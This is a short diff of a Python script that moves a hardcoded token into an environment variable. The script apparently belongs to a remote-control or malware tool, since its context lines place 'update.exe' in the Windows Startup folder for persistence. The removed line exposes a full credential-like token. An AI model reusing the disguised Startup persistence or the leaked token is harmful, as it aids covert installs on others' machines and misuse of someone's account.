@@ -11,6 +11,9 @@ import time
 from threading import Thread
 import tkinter as tk
 from tkinter import messagebox
+from dotenv import load_dotenv  # Add this import
+
+load_dotenv()
 
 path1 = "C:/users/"
 path2 = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/update.exe"
@@ -18,7 +21,7 @@ path=(path1 + getpass.getuser() + path2)
 print(str(path))
 
 
-token = "MTIxMzA4MDI4NTM2NTgwMTAyMA.G_LQwo.0xAx62HF3pNe1S4o3BNvHXaXULLgBZSoQ5PBn8"
+token = os.getenv("Ethan")
 timeout = 1
 connection = False
 def wifi_check():
